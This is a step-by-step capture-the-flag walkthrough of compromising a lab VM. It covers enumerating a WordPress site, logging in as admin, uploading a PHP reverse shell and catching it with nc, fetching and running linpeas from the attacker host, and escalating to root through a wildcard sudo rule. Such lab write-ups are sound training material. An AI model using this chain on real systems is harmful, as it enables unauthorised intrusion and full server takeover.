1. Scan the network segment.
    ```
    $ sudo netdiscover -i eth0
    Currently scanning: 172.16.137.0/16   |   Screen View: Unique Hosts  
    35 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 2100 
    ___________________________________________________________________________
       IP            At MAC Address     Count     Len  MAC Vendor / Hostname
    ___________________________________________________________________________
     192.168.163.1   00:50:56:c0:00:08     30    1800  VMware, Inc.        
     192.168.163.2   00:50:56:f4:a6:3d      2     120  VMware, Inc. 
     192.168.163.132 00:0c:29:8a:04:98      1      60  VMware, Inc.
     192.168.163.254 00:50:56:e2:ec:4c      2     120  VMware, Inc. 
    ```
2. Scan the target IP address.
    ```
    $ nmap 192.168.163.132 -sV   
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-29 03:39 EDT
    Nmap scan report for 192.168.163.132
    Host is up (0.00025s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 2.0.8 or later
    80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
    MAC Address: 00:0C:29:8A:04:98 (VMware)

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 11.86 seconds
    ```
3. Confirm our own IP address.
    ```
    $ ifconfig      
    eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
            inet 192.168.163.128  netmask 255.255.255.0  broadcast 192.168.163.255
            inet6 fe80::5e61:43ea:ac9b:5c07  prefixlen 64  scopeid 0x20<link>
            ether 00:0c:29:df:e7:89  txqueuelen 1000  (Ethernet)
            RX packets 1242  bytes 115233 (112.5 KiB)
            RX errors 0  dropped 0 overruns 0  frame 0
            TX packets 101137  bytes 6079712 (5.7 MiB)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

    lo: flags=73<UP,LOOPBACK,RUNNING,MULTICAST>  mtu 65536
            inet 127.0.0.1  netmask 255.0.0.0
            inet6 ::1  prefixlen 128  scopeid 0x10<host>
            loop  txqueuelen 1000  (Local Loopback)
            RX packets 8  bytes 480 (480.0 B)
            RX errors 0  dropped 0 overruns 0  frame 0
            TX packets 8  bytes 480 (480.0 B)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
    ```
4. Visit the web page at `http://192.168.163.132`.
![image](https://hackmd.io/_uploads/H1Iuog8weg.png)
5. Perform directory enumeration on the web server.
    ```
    $ dirb http://192.168.163.132    

    -----------------
    DIRB v2.22    
    By The Dark Raver
    -----------------

    START_TIME: Tue Jul 29 03:43:15 2025
    URL_BASE: http://192.168.163.132/
    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

    -----------------

    GENERATED WORDS: 4612                                                          

    ---- Scanning URL: http://192.168.163.132/ ----
    ==> DIRECTORY: http://192.168.163.132/img/                                                                                                                
    + http://192.168.163.132/index.html (CODE:200|SIZE:1465)                                                                                                  
    + http://192.168.163.132/robots.txt (CODE:200|SIZE:102)                                                                                                   
    + http://192.168.163.132/server-status (CODE:403|SIZE:295)                                                                                               
    ==> DIRECTORY: http://192.168.163.132/store/                                                                                                              
    ==> DIRECTORY: http://192.168.163.132/users/                                                                                                              

    ---- Entering directory: http://192.168.163.132/img/ ----
    + http://192.168.163.132/img/favicon.ico (CODE:200|SIZE:1406)                                                                                             

    ---- Entering directory: http://192.168.163.132/store/ ----

    ---- Entering directory: http://192.168.163.132/users/ ----

    -----------------
    END_TIME: Tue Jul 29 03:43:27 2025
    DOWNLOADED: 18448 - FOUND: 4
    ```
6. View the `robots.txt` page: `http://192.168.163.132/robots.txt`
![image](https://hackmd.io/_uploads/Sk972lUwgl.png)
7. View `http://192.168.163.132/store/track.txt`
![image](https://hackmd.io/_uploads/rJdn3gLvxg.png)
8. Connect as a guest to `ftp://192.168.163.132` (port 21) and obtain the first token.
![image](https://hackmd.io/_uploads/r1hwhW8Deg.png)
    ```
    PumpkinToken : 2d6dbbae84d724409606eddd9dd71265
    ```
9. View the page source and find the second token.
![image](https://hackmd.io/_uploads/rJSezGUvle.png)
    ```
    PumpkinToken : 45d9ee7239bc6b0bb21d3f8e1c5faa52
    ```
10. Although `http://192.168.163.132/tokens` is not accessible, we can try different directories, such as `/tokens/token.txt`, `/tokens/token1.txt`, and so on. This leads us to discover the third token.
![image](https://hackmd.io/_uploads/B1MSN9ODgx.png)
    ```
    PumpkinToken : 2c0e11d2200e2604587c331f02a7ebea
    ```
11. Add `harry.pumpkins.local` to my `/etc/hosts` file.
    ```
    $ echo "192.168.163.132 pumpkins.local harry.pumpkins.local" | sudo tee -a /etc/hosts
    [sudo] password for jolin: 
    192.168.163.132 pumpkins.local harry.pumpkins.local
    ```
12. `harry.pumpkins.local` returned the same content as the main page. This indicates that the subdomain `harry.pumpkins.local` is valid.
![image](https://hackmd.io/_uploads/SyuXEzUvex.png)
13. `http://pumpkins.local` reveals a WordPress-themed website.
    ```
    $ curl http://pumpkins.local                       
    <!DOCTYPE html>
    <html lang="en-US" class="no-js no-svg">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="profile" href="http://gmpg.org/xfn/11">
    .
    .
    .
    .
    ```
14. Run `wpscan` to enumerate users, themes, and plugins to look for a way in.
    ```
    $ wpscan --url http://pumpkins.local --enumerate u,t,p
    ```
    ![image](https://hackmd.io/_uploads/S1ICQ8_veg.png)
    We found two users: morse and admin.
    ![image](https://hackmd.io/_uploads/H1CrhPdPee.png)
    Some accessible paths.
15. Use `wpscan` to brute-force the two discovered users.
    ```
    $ wpscan --url http://pumpkins.local -U morse,admin -P /usr/share/wordlists/rockyou.txt
    ```
    - It takes forever... there are more than 20 million payloads.
16. Use the registration page discovered in the directory we previously enumerated to access the login page.
![image](https://hackmd.io/_uploads/SyCLpPuDxe.png)
We tried logging in with the hint from the homepage: `admin:Alohomora!`, and fortunately it worked.
![image](https://hackmd.io/_uploads/rkCJ0P_vge.png)
17. We see the fourth token on the homepage.
![image](https://hackmd.io/_uploads/r1jPdKODgl.png)
    ```
    PumpkinToken : f2e00edc353309b40e1aed18e18ab2c4
    ```
18. In the User profile, we see the fifth and sixth tokens on the admin and morse pages.
![image](https://hackmd.io/_uploads/BJ0lPFOvxl.png)
    ```
    PumpkinToken : 06c3eb12ef2389e2752335beccfb2080
    ```
    ![image](https://hackmd.io/_uploads/Hyng3F_wxg.png)
    ```
    PumpkinToken : 7139e925fd43618653e51f820bc6201b
    ```
19. During the earlier `wpscan` scan, we found a clue indicating that the directory could be opened directly in the browser like a folder to view all files and directories inside.
![image](https://hackmd.io/_uploads/Syyhuq_Pee.png)
20. On the Plugins page, upload a prepared [reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
![image](https://hackmd.io/_uploads/S1jnYc_Dxx.png)
21. Sure enough, it appears at `http://pumpkins.local/wp-content/uploads/2025/07/`
![image](https://hackmd.io/_uploads/Sysdc9uDge.png)
22. Start the listener on the attack side.
    ```
    $ nc -lvnp 4444
    ```
    Execute the shell.
    ```
    $ curl "http://pumpkins.local/wp-content/uploads/2025/07/shell-1.php" 
    ```
    The reverse connection succeeds.
![image](https://hackmd.io/_uploads/Bk5Ln9dvge.png)
23. The current shell is a non-interactive basic shell with limited functionality, so we first need to upgrade it to a fully functional TTY shell.
    ```
    listening on [any] 4444 ...
    connect to [192.168.163.128] from (UNKNOWN) [192.168.163.132] 43588
    Linux pumpkin 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
     13:00:39 up  5:42,  0 users,  load average: 0.00, 0.01, 0.05
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    ```
    Upgrade the shell:
    ```
    $ python -c 'import pty; pty.spawn("/bin/bash")'
    ```
    ![image](https://hackmd.io/_uploads/Hk2QC9dPgx.png)
24. Start a web server on the attack side.
    ```
    $ python -m http.server
    ```
    Download `linpeas.sh` to the victim machine.
    ```
    $ wget http://192.168.163.128:8000/linpeas.sh -O /tmp/linpeas.sh
    ```
    Set execution permissions and start scanning.
    ```
    $ chmod +x linpeas.sh
    $ ./linpeas.sh
    ```
25. In step 14, the scan revealed a path: `http://pumpkins.local/readme.html`
![image](https://hackmd.io/_uploads/SkpqX2uDxe.png)
Decoding the base62 string revealed the passwords for jack and morse.
![image](https://hackmd.io/_uploads/SJp7E3dPll.png)
    ```
    morse & jack : Ug0t!TrIpyJ
    ```
26. Log in as the `jack` user.
    ```
    $ su jack
    ```
    List all commands that the current user can run via `sudo`.
    ```
    $ sudo -l
    ```
    ![image](https://hackmd.io/_uploads/H1_342Owee.png)
    * The last line means that the user `jack` can use `sudo`. He can do so as any user (`ALL`), by default as `root`. The commands he is allowed to run are located in the `/home/jack/pumpkins/` directory, and any command matching the pattern `*` within that directory can be executed.
    * The asterisk `*` (wildcard) is the key to privilege escalation. This allows us to create a malicious script beginning with `alohomora` and then execute it with `sudo` to obtain a `root shell`.
27. Create and enter the `pumpkins` directory.
    ```
    $ mkdir pumpkins
    $ cd pumpkins
    ```
    Create a malicious script.
    ```
    $ echo "/bin/bash" > alohomora-shell
    ```
    Run the script to escalate privileges.
    ```
    $ sudo ./alohomora-shell
    ```
28. Enter the `root` directory.
![image](https://hackmd.io/_uploads/BJRYw2uwgg.png)
    ```
    # cat PumpkinFestival_Ticket
    ```
    Print the flag.
![image](https://hackmd.io/_uploads/rJ-Lu3uPge.png)
